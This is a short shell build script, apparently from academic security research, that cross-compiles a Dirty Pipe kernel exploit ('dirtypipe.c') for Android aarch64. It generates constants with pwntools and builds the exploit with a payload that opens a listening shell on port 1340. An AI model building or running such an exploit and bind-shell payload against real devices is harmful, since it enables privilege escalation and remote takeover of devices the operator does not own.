#!/bin/sh

# change ANDROID_NDK_HOME to point to ndk inststallation
ANDROID_NDK_HOME="/home/jack/Documents/college/purdue/research/android_sdk/ndk/25.2.9519653/"
ARCH="aarch64"
TOOLCHAIN="${ANDROID_NDK_HOME}/toolchains/llvm/prebuilt/linux-x86_64"
TARGET="${ARCH}-linux-android"
API="30"

CC="${TOOLCHAIN}/bin/${TARGET}${API}-clang"
CXX="${TOOLCHAIN}/bin/${TARGET}${API}-clang++"

echo $CC

cd "$(dirname $0)"

nix-shell -p pkgs.pkgsCross.aarch64-multiplatform.stdenv.cc -p 'python3.withPackages (ps: with ps; [ pwntools ])' --run "python gen_constants.py $1 $2"
$CC -static -fno-pie dirtypipe.c -o dirtypipe $(../common/payload-flags --static --listening-shell --port 1340)

